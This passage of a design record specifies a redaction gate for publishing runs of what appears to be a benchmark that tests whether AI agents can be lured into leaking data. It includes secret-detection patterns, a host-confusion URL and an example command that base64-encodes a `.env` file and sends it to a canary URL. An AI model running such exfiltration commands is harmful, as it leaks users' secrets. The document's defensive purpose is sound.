# ADR-0017: Publishing a run (`publish` subcommand and redaction gate)

Status: proposed, implemented (2026-11-02); awaiting maintainer approval. Amended 2026-11-02:
opt-in operator home redaction (`--redact-home`, see "Operator home redaction"). Amended
2026-11-02: unconditional pseudonymisation of operator MCP server names (see "Operator MCP
server names"). Amended 2026-11-02: `--withhold <scenario-id>` (repeatable) to keep a
scenario out of the published copy under the ADR-0014 disclosure policy (see "Withholding a
scenario"). Amended 2026-11-02: encoded spellings of the operator home (dash-encoded project
slug, percent-encoded path) fail the gate and are rewritten by `--redact-home`, followed by a
bare-username check (see "Encoded home spellings"). Amended 2026-11-02: unconditional replacement
of per-run harness canary token values with `<canary-token-N>` (see "Harness canary tokens").
Amended 2026-11-03: `--exclude <scenario-id>` (repeatable) for a result that is not a measurement,
with its own note and manifest field (see "Excluding a scenario"; ADR-0014 amendment).
Amended 2026-11-05 (block B12): operator-value check (`env_value`), context credential shapes
(`credential`), private IPv6 / `user@<ip>:` / single-label `host:port` address rules, relative
detector paths in the evidence record, an evidence-count rule with `--allow-no-evidence`, and
the plain statement of what the gate checks (see the block B12 amendment).
Authorises `src/report/publish.ts`, the `publish` subcommand in `src/cli.ts`, the exported
`findSecretShape()` / `extractHost()` helpers in `src/fixtures/fixture.ts` (and the
path-before-userinfo order of `extractHost()`), and
`test/publish.test.ts`. Builds on evidence-spec §2.1 (run dir layout), §2.3 (manifest),
§5 (redaction and reproducibility) and §6 (reporting).

## Context
A run dir (§2.1) mixes two kinds of artefact. The manifest and the per-repetition
`evidence.json` records are the facts a verdict rests on and are designed to be shareable
(§2.2 stores config bodies as digests, §5). The raw agent stream (`claude-stream.jsonl`) and
the hook capture are stored verbatim (§5) so a verdict can be audited locally; they can carry
whatever the agent read or printed. §6.3 says sharing a report is the maintainer's explicit
action, never the tool's. Until now there was no way to produce a shareable bundle short of
copying the run dir by hand, which would carry the raw transcripts along and offers no check
that the evidence is free of local paths, tokens or third-party URLs.

## Options
1. **Document a manual copy.** No code; relies on the maintainer to pick files and inspect them.
   Rejected: the failure mode (a raw transcript or a home path in a public report) is silent.
2. **Publish with automatic redaction** (rewrite home paths to `~`, mask tokens, drop URLs).
   Rejected: rewriting evidence changes the published facts (§6: a reporter adds or alters no
   facts), and a masked leak hides from the maintainer that the run itself captured something
   it should not have.
3. **Publish with a fail-closed gate.** Build the whole bundle in memory, scan it, and write
   nothing unless the scan is clean. Deliberate exceptions are explicit flags.

## Decision
Option 3.

`lurekit publish <runDir> [--out <dir>] [--allow-host <host>]... [--withhold <scenario-id>]... [--exclude <scenario-id>]... [--redact-home]`

- Default output dir: `reports/<benchmark_run_id>` (relative to the cwd). A non-empty output
  dir is refused, so stale unscanned files cannot ride along. Superseded by the ADR-0022
  amendment (block 5): the default is now `<results>/<benchmark_run_id>/bundle`; the
  repository's `reports/` bundles pass `--out reports/<id>`.
- Bundle contents, and nothing else:
  - `manifest.json` (byte copy, except for operator MCP server names and `--redact-home`
    replacements);
  - every `<scenario>/<rep>/evidence.json` for the manifest's scenarios (byte copy, layout kept,
    except for operator MCP server names and `--redact-home` replacements);
  - `report.md`, `report.json`, `report.sarif`, rendered by `report()` (§6.1). The Markdown
    evidence excerpt uses the same selection rule as `report` (first vulnerable repetition,
    else repetition 0; `selectEvidence()` is shared);
  - `index.md`: headline, run/config summary, tool version, profile summary (agent + version,
    model, permission mode, mcp/hooks/settings digests, profile digest), a scenario table with
    a link to each evidence file, and a file list.
- Never copied: raw transcripts, hook logs, detector logs, or any other file in the run dir.
- Redaction gate (§5), applied to every bundle file, including the renders, before any write.
  Any finding: exit 1, every finding listed on stderr, nothing written.
  - **URL:** an `http(s)` URL whose host is not loopback (`localhost`, `*.localhost`,
    `127.0.0.0/8`, `::1`) and not in the allowlist. The allowlist is the set of hosts of the
    manifest results' `source` URLs plus each `--allow-host`. The two URLs the renders always
    contain (the SARIF `$schema` URL and the repository `informationUri`) are allowed as exact
    strings, not as hosts.
  - **Token shape:** any match of the fixture inertness patterns (`SECRET_PATTERNS` in
    `src/fixtures/fixture.ts`, via `findSecretShape()`), so there is one list of token shapes.
    The message names the pattern family and never echoes the value.
  - **Home path:** an absolute path under the publishing user's home dir (`os.homedir()`,
    injectable via `CliDeps.homeDir`) or under a conventional home root (`/home/<u>`,
    `/Users/<u>`, `/root`, `<drive>:\Users\<u>`). It is not rewritten to `~`.
  - Each file is scanned as written and, when it differs, in a scan-only view where JSON
    whitespace escapes (`\n`, `\t`, `\r`, `\b`, `\f`) become a space (an escaped backslash
    `\\` is kept). Without it a value right after an escaped newline in `evidence.json`
    (`"ls\n/home/u"`) sits next to a word character and the patterns' `\b` / lookbehind
    anchors would not fire. The published bytes are never rewritten.
  - A URL's host is taken after stripping path, query and fragment, then userinfo
    (`extractHost()`), so `https://evil.example/x@github.com` has host `evil.example`, not an
    allowlisted source host. The same fix tightens fixture invariant (a) (`assertLoopback`).
- **Operator home redaction (`--redact-home`, opt-in).** Off by default; without it the
  behaviour above is unchanged and an operator home path fails the gate. When set:
  - every occurrence of the operator home dir (`CliDeps.homeDir()`, else `os.homedir()`;
    spelled as is, with JSON-escaped backslashes, and with forward slashes; trailing separators
    dropped) in the **published copies** (manifest, evidence, the three renders, `index.md`) is
    replaced by the literal `<HOME>`. An occurrence counts only when the next character ends a
    home segment in the gate's own patterns (`/`, `\`, whitespace, a quote or backtick, `<`,
    `>`, `|`) or the text ends, so `/home/u` never rewrites the prefix of a sibling such as
    `/home/u2`, `/home/u@old`, `/home/u+bak` or `/home/uü`. Any other following character
    (`)`, `,`, `:`) leaves the occurrence as is, and it fails the gate (fail closed);
  - the run dir is never modified: the replacement is applied to the in-memory copies only;
  - `index.md` gains a `## Redaction` section with the line
    `redaction applied: home directory -> <HOME> (N replacements)`, N being the total over the
    bundle (the same line is printed on stdout);
  - the gate then runs on the redacted bundle exactly as without the flag: any other home-style
    path (another user's `/home/<u>`, `/Users/<u>`, `/root`, `<drive>:\Users\<u>`), any token
    shape and any non-allowlisted URL still fail, and nothing is written;
  - a missing or root-ish home dir (empty, `/`) with the flag is an error, not a silent no-op.
- **Encoded home spellings.** A live run (AAB-016) published after `--redact-home` still named
  the operator: the agent read a transcript under the runtime's project dir
  (`<HOME>/.claude/projects/-home-<u>-<rest>/...`), whose name is the home path with every
  separator replaced by `-`, so the plain-path rewrite left the username in place. Therefore:
  - the gate also fails, like a plain home path (`home_path` finding), on the operator home's
    **dash-encoded slug**: the home with every `/` or `\` replaced by `-` (and, as the runtime
    actually does, every non-alphanumeric replaced by `-`), not preceded or followed by an
    alphanumeric. The leading `-` is optional for a multi-segment home (`/home/<u>`). For a
    single-segment home (`/root`) the slug core is a bare word, so the leading `-` is required
    and must not follow another `-` (`-root` matches; `running as root` and `--root` do not); on the operator home **percent-encoded**
    (`encodeURIComponent` of the raw and forward-slash forms, e.g. `%2Fhome%2F<u>`, either hex
    case); and on any percent-encoded home root (`%2Fhome%2F<u>`, `%2FUsers%2F<u>`). The
    JSON-escaped and forward/back-slash spellings stay as above;
  - with `--redact-home`, after the plain rewrite, a slug occurrence becomes `<HOME-SLUG>` and a
    percent-encoded one becomes `<HOME>`. A slug counts only when followed by `-`, a separator,
    whitespace, a quote or backtick, `<`, `>`, `|` or the end; a percent spelling only when
    followed by `%`, a separator, whitespace, a quote or backtick, `<>|&?#` or the end. Gate
    detection ends at any non-alphanumeric, wider than these sets, so whatever is not rewritten
    still fails (fail closed);
  - `index.md`'s `## Redaction` section gains the line
    `redaction applied: encoded home directory: project slug -> <HOME-SLUG> (S replacements),
    percent-encoded -> <HOME> (P replacements)`. The plain-path line and its stdout copy keep
    their meaning (plain spellings only);
  - the gate then re-runs on the redacted bundle as usual. As a final check, if the operator's
    bare username (the last path segment of the home dir) still appears anywhere in the bundle
    as a token bounded by non-alphanumerics (or the text ends), the publish fails with a
    `home_user` finding per file. The finding names the file, never the value. The check is
    case-sensitive and runs only with `--redact-home`. Without the flag, any spelling of the home
    path already fails.
- **Operator MCP server names (unconditional).** Evidence records carry the agent's own init
  report `observation.mcp_servers` (`name`/`status`/`source`, evidence-spec §4.3). Entries whose
  `source` is `user`, `local`, `claudeai`, `enterprise`, `managed` or anything else not
  configured by the harness describe the operator's own MCP servers and connectors: a
  configuration disclosure the §5 gate does not catch (a server name is neither a URL, a token
  nor a home path). Before `--redact-home` and before the gate:
  - every `mcp_servers` array anywhere in the manifest and in each evidence record is walked;
    an entry whose `source` is `dynamic` (the harness's `--mcp-config` fixture servers) or
    `project` (a fixture-planted `.mcp.json`) is kept as is; every other entry, including one
    with no `source` at all (fail closed), has its `name` replaced by `<user-mcp-N>`;
  - `N` is assigned per distinct original name in first-seen order (manifest, then evidence in
    bundle order), with one map for the whole publish, so the same server gets the same
    placeholder in every file; `status` and `source` are kept; a placeholder that equals the
    name of any kept (`dynamic`/`project`) entry anywhere in the run is skipped (all files are
    parsed before the first placeholder is assigned), so a placeholder never collides with a
    fixture server name;
  - the rewrite is applied to the parsed objects; only files with at least one replacement are
    re-serialised (indentation detected from the original, trailing newline kept), every other
    file stays a byte copy; the three renders are built from the rewritten objects;
  - when at least one entry was rewritten, `index.md`'s `## Redaction` section gains the line
    `redaction applied: operator MCP server names (mcp_servers entries whose source is not
    dynamic/project) -> <user-mcp-N> (R replacements, D distinct names)`;
  - the run dir is never modified.
- **Harness canary tokens (unconditional).** Each detector mints a random per-run secret and
  records it in the evidence it writes (`src/detectors/*.ts`): `canary_egress_http` and
  `canary_mcp_tool` a 32-hex `token`, `canary_file_read` a 32-hex `marker`, `canary_command` an
  `aab-canary-<hex>` command name, `canary_egress_http` (registry mode) an `aab-canary-<hex>`
  `package`. These land at `detector_hits[].matched.token` / `.marker` / `.command` / `.package`
  (and, embedded, inside a URL, an argv entry or a request path the same hit carries). They are
  control-sensor bookkeeping, not findings, and a bare hex run or `aab-canary-...` name is neither
  a URL, a known token prefix nor a home path, so the §5 gate does not catch it — yet a published
  `"token": "<32 hex>"` reads as a live credential to a secret scanner (gitleaks `generic-api-key`).
  Therefore, with the MCP-name rewrite and before `--redact-home` and the gate:
  - every `manifest.json` and evidence record is walked; the string value at a key in
    {`token`, `marker`, `command`, `package`} is harvested **only when it has a canary shape**
    (`aab-canary-<hex>`, or a hex run of 16+), so a real value sharing one of those keys (a tool
    call's `input.command` of `ls`, a fixed decoy tool name) is never taken;
  - each distinct harvested value is assigned `<canary-token-N>`, `N` in first-seen order
    (manifest, then evidence in bundle order), with one map for the whole publish, so one value
    gets one placeholder in every file;
  - a value no detector hit recorded (the agent only named the registry package, the canary
    command or the token in a tool call, so `detector_hits` is empty) is harvested as well, two
    ways: any `aab-canary-<hex>` **substring** of the manifest or an evidence file (the prefix is
    harness-only), then the `token` / `marker` / `command` / `package` values (same shape guard)
    of each kept scenario's `<id>/<rep>/<kind>.canary.json` detector metadata. Those metadata files
    are read for this only and are **never published**; a withheld scenario's metadata is not read;
    a metadata file that is not valid JSON fails the publish closed (nothing written). The decoy
    file name (`fileName`, `canary_<hex>.decoy`) is a path, not a token, and is not harvested;
  - every occurrence of each value is replaced across the **whole** bundle (manifest, evidence,
    the three renders, `index.md`), including where the value is embedded in a larger string, so a
    token inside a URL, an `argv` entry or a captured request path is masked too; the surrounding
    structure (a loopback host, the rest of a command line) is kept;
  - integrity digests (`scenario_version`, `task_sha256`, `settings_digest`, `input_digest`,
    `corpus_digest`), scenario `source` URLs and scenario ids live at other keys and are never
    harvested, so they survive unchanged;
  - when at least one value was replaced, `index.md`'s `## Redaction` section gains the line
    `redaction applied: harness canary tokens (per-run detector token/marker/command/package
    values) -> <canary-token-N> (R replacements, D distinct tokens)`, where `D` counts only the
    harvested values that were actually replaced;
  - the run dir is never modified (the replacement is on the in-memory copies only).
- **Withholding a scenario (`--withhold <scenario-id>`, repeatable, opt-in).** ADR-0014 keeps
  a scenario citing a still-unpatched issue out of the public catalog until the fix ships or 90
  days pass. A run may still include it (CI runs the private tier), so its verdict and evidence
  must be keepable out of a published bundle without deleting it from the run. For each named
  id:
  - the id must be the `scenario_id` of a manifest result; an unknown id is an error and
    nothing is written (a typo must not publish the scenario it meant to hold back); a repeated
    id counts once;
  - the scenario's entry is removed from the published copy of `manifest.results`, and
    `manifest.totals` is recomputed from the remaining results with the runner's rule (one per
    verdict, `spend_usd` summed and rounded to 6 decimals), so the vulnerable count drops when a
    vulnerable scenario is withheld. The `corpus` block (count, ids, digest) was kept as is
    until the block-4 amendment below ("Corpus block of a reduced bundle"): it now lists the
    published scenarios only;
  - none of its `<scenario>/<rep>/evidence.json` files is copied, parsed or scanned;
  - `report.md`, `report.json`, `report.sarif` and `index.md` are rendered from the reduced
    manifest, so the headline, scenario tables and SARIF results never mention its verdict;
    its source URL is no longer in the gate's allowlist (it is not in the bundle either);
  - `index.md` gains a `## Withheld` section with the count and one line per id:
    `<id>: withheld pending coordinated disclosure (ADR-0014)` (no name, source or verdict);
  - it applies first: operator MCP name pseudonymisation (numbering, reserved names) and
    `--redact-home` see only the reduced bundle, and the gate runs on the reduced bundle as
    usual;
  - the run dir is never modified.
- **Excluding a scenario (`--exclude <scenario-id>`, repeatable, opt-in).** A finished run can
  hold a result that is not a measurement: the scenario's fixture had a defect fixed after the
  run (e.g. AAB-056's `web_server` page never named the canary command, fixed in `03ef83e`), so
  its `resisted` verdict is vacuous. Publishing it as `resisted` would mislead, and labelling it
  withheld under ADR-0014 would be false. `--exclude` handles files and numbers exactly as
  `--withhold` does (same unknown-id error, a repeated id counts once, result dropped, totals
  recomputed, evidence and detector metadata not copied, parsed or scanned, renders from the
  reduced manifest, applied first, run dir untouched), and differs only in what it says:
  - `index.md` gains a `## Excluded` section with the count and one line per id:
    `<id>: excluded by the operator: result is not a measurement (see the bundle notes)` (no
    name, source or verdict); the reason itself belongs in the maintainer's notes for the bundle;
  - the published `manifest.json` (and so `report.json`, which embeds it) gains a top-level
    `excluded` array of those ids in manifest order (evidence-spec section 2.3); withheld ids are not
    recorded there;
  - stdout prints `excluded (not a measurement): <id>[, <id>...]`;
  - an id given to both `--withhold` and `--exclude` is an error and nothing is written; both
    flags may be used together on different ids.
- Ids that become path segments (`benchmark_run_id`, scenario ids) must match
  `^[A-Za-z0-9][A-Za-z0-9._-]*$`; anything else fails the publish.
- Offline: no network, no agent, no clock. The command writes local files only; uploading or
  sharing the bundle remains the maintainer's action (§6.3).

## Usage
```sh
lurekit publish .aab-runs/<benchmark_run_id>
lurekit publish .aab-runs/<id> --out site/runs/<id>
# a deliberate exception, e.g. a vendor docs host cited in an evidence record
lurekit publish .aab-runs/<id> --allow-host docs.vendor.example
# the run legitimately names the operator's own home (e.g. the agent listed the memory dir
# the agent runtime announced); publish it as <HOME>
lurekit publish .aab-runs/<id> --redact-home
# keep a scenario citing a still-unpatched issue out of the bundle (ADR-0014)
lurekit publish .aab-runs/<id> --withhold AAB-030
# leave out a result that is not a measurement (fixture defect fixed after the run)
lurekit publish .aab-runs/<id> --exclude AAB-056
```
A failing gate prints, for example:
```
publish: redaction gate failed (evidence-spec §5), 1 finding(s); nothing written
  AAB-030/0/evidence.json: home_path: absolute home path "/home/alice"
```

## Amendment (2026-11-03, block 4): stricter gate, allow-URL, atomic bundle

Every change here makes the gate stricter or the I/O safer; a bundle the gate rejected before is
still rejected. The ten committed bundles under `reports/` (and the `demo/` copy) pass the new
gate unchanged; `test/publish-gate.test.ts` re-gates every file of each one.

- **Gate patterns.** Besides `url`, `token`, `home_path` and `home_user`, the gate reports these
  finding kinds (one finding per kind and host per file; the detail names the host or the
  pattern family, never a value):

  | kind | matches |
  |---|---|
  | `url` | `http(s)://` URL not on a loopback host, not an intrinsic tool URL, not an exact scenario source URL (below), not on an `--allow-host` host; and a URL of any other scheme of 2+ chars (`ftp`, `smb`, `postgres`, `redis`, ...) not on a loopback or `--allow-host` host. The separator is any run of two or more `/` or `\` (`https:\\host`, `https:///host`); a known scheme glued to a preceding word (`xhttps://`) is judged as that scheme; `file:///path` (no host) is left to `home_path` |
  | `ws_url` | `ws://` / `wss://` URL not on a loopback or `--allow-host` host |
  | `ssh_url` | `ssh://`, `git://`, `git+ssh://`, `sftp://`, `scp://` URL, same rule |
  | `git_ssh` | scp-style remote `user@host:path` (`git@github.com:org/repo.git`) |
  | `host` | scheme-less `host:port` or `host/path` whose last label is a curated public TLD (`GATE_PUBLIC_TLDS`; TLDs that collide with file extensions, such as `md`, `sh`, `py`, `rs`, `ts`, `app`, `zip`, are left out), not preceded by a URL, path or address character; a dotted host ending in an internal TLD (`GATE_INTERNAL_TLDS`: `internal`, `local`, `lan`, `corp`, `example`, ...) with or without port/path; a protocol-relative `//host.tld`; a scheme-less IPv4 with a port; a private-range IPv4 (RFC 1918, CGNAT `100.64/10`, link-local `169.254/16`) with or without a port |
  | `email` | an email address (`local@dotted.domain`) |
  | `token` | prefixed keys: `sk-`, `ghp_`/`gho_`/`ghu_`/`ghs_`/`ghr_`, `github_pat_`, `glpat-`, `AKIA`, `xox[baprs]-`, `AIza` |
  | `bearer` | `Bearer <20+ token68 chars>` (scheme word in any case) |
  | `jwt` | `eyJ<seg>.<seg>.<seg>` (three base64url segments of 10+ chars) |
  | `private_key` | a PEM private-key header (`-----BEGIN [<word> ]PRIVATE KEY-----`, PGP `... BLOCK`) |

  The credential shapes (`token`, `bearer`, `jwt`, `private_key`) live in one list,
  `SECRET_PATTERNS` in `src/fixtures/fixture.ts`, so fixture inertness and the adapters' stderr
  excerpts tighten with the gate. Loopback forms of every URL/host kind, the pseudonyms
  (`<canary-token-N>`, `<user-mcp-N>`, `<HOME>`, `<HOME-SLUG>`), npm package specs
  (`pkg@1.2.3`) and the scenario source URLs are not findings.
  Extended by the block B12 amendment below: kinds `credential` and `env_value`, private IPv6
  and `user@<ip>:` remotes, single-label `host:port`.
- **Allow-URL.** The allow-list is no longer the hosts of the scenario sources (which made every
  `github.com` URL pass, including an operator's private repository). A non-loopback `http(s)`
  URL passes only if it equals, ignoring the fragment (scheme and host compared lowercase), a
  `source.*` URL (`primary_url`, `secondary_urls`, any other URL field of the block) of a
  scenario in the run's published corpus (`corpus.scenario_ids` after filtering, read from the
  scenario corpus: the shipped one by default, `--scenarios <dir>` for the run's own), or the
  `source` of a published result; or if the operator names its host with `--allow-host`, which
  opens every kind above on that host. The tool's two intrinsic URLs stay exact strings.
- **Operator username.** The bare-username check runs on every publish when the username (last
  segment of the home directory) has at least 4 characters, not only under `--redact-home`;
  under `--redact-home` it runs for any length, as before.
- **Harness canary tokens.** Besides the detector keys and `aab-canary-<hex>`, every
  `aab-<word>-<hex>` substring (lowercase letters word, 8+ hex) is a minted harness value and is
  pseudonymised: `aab-skill-<hex>` (skill package markers), `aab-web-<hex>` (web server markers)
  and any later minter. A benchmark run id (`aab-<digits>-<hex>`) never matches.
- **Corpus block of a reduced bundle.** With `--withhold`/`--exclude`, the published
  `corpus.scenario_ids` drops the withheld/excluded ids and `scenario_count` follows;
  `corpus_digest` is recomputed with the runner's algorithm over the published scenarios, and
  the run's original digest is kept as `corpus_digest_full` (evidence-spec section 2.3). The
  recomputation reads the scenario files and first checks that they reproduce the original
  digest over the original ids; when they do not (the corpus changed since the run, or a
  scenario is missing), the publish fails with a `--scenarios <dir>` hint and nothing is
  written. Without a drop the corpus block stays a byte copy.
- **Run-dir reading.** `readRunDir` uses `lstat` and never follows a symlink: a symlinked
  scenario dir, repetition dir, `evidence.json` or `<kind>.canary.json` is skipped with a
  `warning: publish: skipped symlink <rel>` line on stderr; a symlinked `manifest.json` fails the
  publish.
- **Atomic bundle.** `writeBundle` writes into `<out>.partial`, then renames it to `<out>` (an
  existing empty `<out>` is removed first); on any failure the partial dir is removed, so a
  failed write leaves nothing. A pre-existing `<out>.partial` is refused, never deleted.
- **MCP placeholder numbering** no longer rebuilds a Set of used placeholders per new name
  (O(n) per name before); the next N starts after the highest one handed out.

Operator-visible: a URL that used to pass because its host was a scenario source host (another
`github.com` path, an `arxiv.org` paper that is not a source) now needs `--allow-host <host>`; a
bundle whose text names the operator's username (4+ chars) fails without `--redact-home`; a
`--withhold`/`--exclude` publish of a run whose corpus files changed since needs `--scenarios`.

## Amendment (2026-11-05, block B12): operator values, credential shapes, address gaps, relative detector paths, evidence count

Specced before the code (CLAUDE.md). Findings SECURITY-01, SECURITY-05, SECURITY-07, UX-11,
DOCS-03 and DOCS-14 of `docs/plan/improvement-plan-2026-11-05.md`. Every change makes the gate
stricter or the bundle more honest; a bundle the gate rejected before is still rejected. The ten
committed bundles under `reports/`, the `demo/` copy and the CI replay publish pass unchanged:
every pattern below was run over `reports/`, `demo/`, both replay recordings, the scenario
corpus and the guides at `4b4357a` with zero matches (`.aab-runs/b12/fp-scan.mjs`, kept out of
the repository), and `test/publish-gate.test.ts` keeps re-gating every file of each bundle.
Normative text for the paths and the gate kinds is in evidence-spec s1.5, s2.2 and s5.

- **What the gate checks, stated plainly (replaces the "keeps those inputs safe" sentence of the
  Consequences).** Evidence records are published verbatim, tool-call inputs included, because
  those inputs are the audit proof a reader needs (evidence-spec s1.4, s5); a digested copy
  would be unverifiable, so "input_digest by default" stays rejected (plan, "Rejected or
  deferred"). The gate is a deny-list of known shapes checked over every published byte: URLs
  and hosts (the table above and the address rules below), credential shapes (the
  `SECRET_PATTERNS` families plus the credential shapes below), the values of the variables
  forwarded to the agent (below), and home paths. It is not a proof that an input is safe: a
  secret with no known prefix that sits in no assignment, flag, URL or forwarded variable
  passes. The maintainer reads the evidence of any run that did something unusual before
  publishing it (`docs/guide/publishing.md`, "Limits"); README.md, the launch article and the
  publishing guide carry the same sentence as this amendment, never the old "keeps inputs safe"
  claim.
- **Operator values (`env_value`, unconditional).** New finding kind. A value the operator's
  shell or settings handed the agent is the one secret the harness can know without guessing
  its shape, so the gate compares the bundle against those values and names only the variable.
  Sources:
  - the publishing process environment: for every name in the union of
    `observation.env_forwarded` over the published evidence records that is neither a process
    basic (`BASE_ENV_ALLOW` names and prefixes in `src/adapters/childEnv.ts`, which includes
    `AAB_*`) nor listed in `ENV_VALUE_EXEMPT` (new exported constant next to the allow-lists so
    block B11 maintains the two together: `ANTHROPIC_BASE_URL`, `LLM_BASE_URL`, `LLM_MODEL`,
    `CURSOR_API_ENDPOINT`, `CODEX_HOME`, `DISABLE_AUTOUPDATER`; URLs and paths in those are judged
    by the url/host/home rules), the value of that name in the publishing shell, when set. The
    replay adapter records no `env_forwarded`, so a replay publish (CI) checks nothing here;
  - the adapter's harness settings file of every kept repetition
    (`<id>/<rep>/claude-settings.json`, evidence-spec s2.1; written by the Claude Code adapter,
    never published): the string values of its top-level `env` object, every name. `readRunDir`
    harvests them exactly as it reads canary metadata: `lstat`, a symlinked file is skipped with
    the usual warning, a file that is not valid JSON fails the publish closed (nothing written),
    and the files of withheld or excluded scenarios are not read.

  A value shorter than 8 characters is skipped (shorter values collide with ordinary words; a
  documented limit), and so is a value equal to the published `profile.model` or
  `profile.agent_version` (published facts by design). Each remaining value is looked for as a
  substring, in every scan view of every bundle file after the unconditional rewrites and
  `--redact-home`, in these spellings: raw; JSON-escaped (`JSON.stringify` without the quotes);
  percent-encoded (`encodeURIComponent`); base64 standard and base64url, each with and without
  padding. A match is one finding per file and name: kind `env_value`, detail
  `value of environment variable NAME present (value redacted)`. The check is a pure function of
  (bundle files, name->value map); the CLI builds the map from `process.env` and the harvested
  settings and passes it through `PublishPolicy` (`operatorEnv`) and `RunDirContents`
  (`settingsEnv`); `scanForLeaks` stays pure. Limits, recorded here: the publishing shell may
  not be the shell that ran the benchmark (then the variable is unset there and the check is
  silent for it), and a value the agent transformed in any other way (hashed, split, re-encoded
  twice) passes; the credential shapes below are the backstop for those.
- **Credential shapes (`credential`, unconditional).** New finding kind for a credential
  recognised by its context rather than its prefix. The shapes live in one list,
  `CREDENTIAL_SHAPES` in `src/report/publish.ts`, separate from `SECRET_PATTERNS`: they are
  assignment/flag/URL contexts, not token shapes, and fixture inertness must keep accepting lure
  prose such as `TOKEN=` followed by a canary (which the canary rewrite turns into
  `<canary-token-N>` before the gate anyway). Scanned per line and over the joined view like the
  token families; the detail names the shape, never the value. A value that starts with `$`, `<`,
  `*`, `{`, `%`, `xxx`, `...` or one of the words `REDACTED`, `CHANGEME`, `EXAMPLE`,
  `PLACEHOLDER` (any case) is a placeholder, not a finding.
  1. *Assignment:* `NAME=value` where `NAME` (bounded by non-word characters, upper case) contains
     `PASSWORD`, `PASSWD`, `SECRET`, `TOKEN`, `API_KEY`, `APIKEY`, `ACCESS_KEY`, `PRIVATE_KEY`
     or `CREDENTIAL(S)`, and `value` is 8+ characters without whitespace or quotes (quotes around
     it allowed). `export`, `set` and `env` prefixes need no special handling. Detail:
     `credential assignment NAME=... (value redacted)`.
  2. *JSON member:* `"NAME": "value"` with the same name family (case-insensitive) and value rule,
     so a settings `env` block or a `.env` file the agent printed is caught in its JSON spelling.
  3. *Flag:* `--password`, `--passwd`, `--secret`, `--token`, `--api-key`/`--apikey`,
     `--access-key` followed by `=` or whitespace and a 4+ character value, not preceded by a word
     character or `-` (so `canary-token rewrite` in prose is not a flag).
  4. *Glued `-p<value>`:* after a MySQL-family command word (`mysql`, `mysqladmin`, `mysqldump`,
     `mysqlsh`, `mariadb`, `mariadb-dump`) on the same command segment (no `|`, `;`, `&` or line
     break in between), `-p` immediately followed by 2+ non-space characters; and
     `sshpass -p <value>`. A bare `-p` with a space after it (`claude -p <task>`, `mkdir -p`) is
     not a finding.
  5. *URL userinfo password:* any scheme URL `scheme://user:password@host` with a non-empty
     password, on every host, loopback and allowed hosts included (the host rules skip loopback;
     this one does not). Detail: `credential in URL userinfo on host "<host>"`.
  6. *Encoded blob:* a hex run of 40+ characters, or a base64 run of 40+ characters
     (`[A-Za-z0-9+/_-]`, optional `=` padding) that contains an upper-case letter, a lower-case
     letter and a digit and no `--` (Markdown anchors and slugs do not qualify), found (a) in the
     query string or a path segment of any URL the URL pattern matches, loopback included, except
     the exact scenario source URLs and the two intrinsic URLs, or (b) anywhere in a detector-owned
     field read structurally from each evidence record: `detector_hits[].matched.requested`,
     `.argv[]` and `.args` (every string, recursively). Pseudonyms (`<canary-token-N>`) are
     exempt. The digests at known keys (`scenario_version`, `task_sha256`, `settings_digest`,
     `input_digest`, `corpus_digest`, `corpus_digest_full`) are never reached: neither a URL nor
     one of the three fields. Detail: `encoded blob in URL query or path` /
     `encoded blob in detector field matched.<key>`. Design choice, recorded: the command text
     `curl <canary-url>?k=$(cat .env | base64)` is a command, not a value, and is not a finding
     (`$` placeholder rule); the value it produced lands in the egress sink and is published as
     `matched.requested`, where rule (b) catches it (the review's `curl_b64` case passes by
     design, `curl_b64_literal` blocks).
- **Address gaps (`host`, `git_ssh`).** Verified misses of the block-4 patterns, each now a
  finding; the public-IPv4-without-port and curated-TLD decisions are not reopened (plan,
  "Rejected or deferred"):
  - the lookbehinds of `IPV4_PRIVATE_RE` and `IPV4_PORT_RE` drop `@` and `:` (they keep `/`, `.`,
    `\`, `-`, `_`, `%`, `+` and alphanumerics). Those two characters were there so a host inside a
    scheme URL is not counted twice, but scheme URLs are blanked from the view (`rest`) before
    these patterns run, so they only hid the scp, userinfo and IPv4-mapped spellings:
    `scp . deploy@10.0.0.5:/srv`, `ssh deploy@10.0.0.5` and `::ffff:10.0.0.7` are `host`
    findings (`private IP address "..."`);
  - scp-style remote on an IPv4 literal, `user@<ipv4>:path` (any IPv4 that is not loopback or an
    `--allow-host` host; `GIT_SSH_RE` required an alphabetic TLD), is a `git_ssh` finding
    (`scp-style remote on host "<ip>"`). A public IPv4 that is not in that form and carries no
    port stays a non-finding, as decided in block 4;
  - a bare IPv6 unique-local (`fc00::/7`: `f[cd]xx:`) or link-local (`fe80::/10`: `fe[89ab]x:`)
    literal, with or without brackets and port, case-insensitive, not preceded by an
    alphanumeric, `:`, `.` or `-` and not followed by an alphanumeric, `.` or `-`, is a `host`
    finding (`private IPv6 address "<addr>"`): `fd12:3456::1`, `fe80::1`, `[fd12::1]:22`,
    `ssh user@fd12:3456::1`. Global IPv6 literals stay out under the same FP budget as public
    IPv4; `::1` stays loopback;
  - a single-label host with a port, decided **for** against the FP budget: a label of 2-63
    characters starting with a letter, `:`, a port of 2-5 digits, preceded by the start of the
    text, whitespace, a quote, a backtick, `=`, `(` or `[`, and followed by whitespace, a quote,
    a backtick, `/`, `)`, `,`, `;`, `]` or the end; `localhost` and `--allow-host` labels are
    skipped. `curl gitlab:8443/api`, `redis:6379` and `db:5432` are `host` findings
    (`single-label host with port "<label>"`); `at 12:30`, `C:123`, `retry:3`, `sha256:ab...`,
    `"port":8080` and `file.ts:12` are not. Measured budget: zero matches over the committed
    bundles, the demo copy, both replay recordings, the corpus and the guides; the override is
    `--allow-host <label>`. A single-label host without a port (`vault/x`) stays out; with a
    scheme (`http://vault:8200`) it was already a `url` finding.
- **Relative detector paths (SECURITY-07).** Besides `evidence_ref`, the runner relativises at
  write time the three detector-owned absolute run-dir paths: `matched.binDir` and
  `matched.recorderPath` of `canary_command`, and `matched.path` of `canary_file_read` (both
  branches). Strings only, and only when the value lies under the run dir (a decoy under an
  explicit `--workdir` base is left as is, like `workdir` itself); tool-call inputs are never
  touched (they are what the agent did, evidence-spec s1.4). Verdicts are unchanged; the
  committed bundles keep their `<HOME>`-redacted absolute form (never edited); a run published
  from a results dir under the home no longer fails the gate on these three keys alone (the
  agent's own tool-call inputs still decide). Normative text: evidence-spec s1.5 (canaries are
  absolute at hand-off), s2.2 (the record stores them relative).
- **Evidence count (UX-11).** `planPublish` counts the kept evidence files (`found`) against the
  planned repetitions of the published results (`expected`, the sum of `results[].runs` after
  `--withhold`/`--exclude`):
  - `found < expected`: stderr `warning: publish: <found> evidence file(s) for <expected>
